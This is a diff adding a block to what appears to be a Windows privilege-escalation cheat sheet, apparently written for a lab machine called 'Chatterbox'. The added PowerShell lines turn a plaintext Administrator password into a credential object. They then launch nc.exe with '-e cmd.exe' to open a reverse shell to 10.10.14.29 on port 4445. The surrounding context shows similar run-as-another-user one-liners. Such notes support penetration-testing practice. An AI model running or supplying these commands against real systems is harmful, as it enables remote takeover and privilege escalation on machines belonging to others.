@@ -414,6 +414,13 @@ cmd> powershell Start-Process cmd.exe -Credential (New-Object System.Management.
 cmd> powershell -command "start-process cmd.exe -argumentlist '/c calc' -Credential (New-Object System.Management.Automation.PSCredential 'username',(ConvertTo-SecureString 'password' -AsPlainText -Force))"
 ```
 
+```
+PS C:\Windows\Temp> $secpasswd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
+PS C:\Windows\Temp> $mycreds = New-Object System.Management.Automation.PSCredential('Administrator',$secpasswd)
+PS C:\Windows\Temp> $computer = 'Chatterbox'
+PS C:\Windows\Temp> [System.Diagnostics.Process]::Start("C:\Windows\Temp\nc.exe", "10.10.14.29 4445 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
+```
+
 * Runas script 1:
 ```
 $username = "Administrator"
